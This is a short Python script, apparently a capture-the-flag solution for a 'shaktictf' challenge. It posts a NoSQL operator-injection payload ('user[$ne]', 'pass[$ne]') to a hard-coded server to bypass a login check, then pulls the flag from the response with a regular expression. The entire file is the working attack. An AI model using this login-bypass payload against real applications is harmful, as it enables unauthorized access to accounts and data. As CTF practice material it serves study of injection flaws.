import requests as req
import re

url="http://34.71.6.79:4000"

data={"user[$ne]":"\w+","pass[$ne]":"\w+"}

request = req.post(url=url,data=data).text

flag = re.findall(r'[shaktictf\{]+.[\S]+[\}]',request)

print(''.join(flag))